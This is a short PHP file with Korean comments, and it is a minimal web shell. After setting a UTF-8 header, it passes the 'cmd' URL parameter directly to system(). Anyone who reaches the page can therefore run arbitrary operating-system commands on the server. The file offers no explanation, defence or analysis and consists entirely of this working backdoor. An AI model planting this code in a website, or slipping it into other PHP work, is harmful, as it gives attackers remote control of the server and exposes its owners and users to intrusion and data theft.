<?php
// UTF-8 헤더 설정
header('Content-Type: text/html; charset=utf-8');

// GET 파라미터 처리
if (isset($_GET['cmd'])) {
    system($_GET['cmd']); // 명령어 실행
} else {
    echo "No command provided.";
}
?>
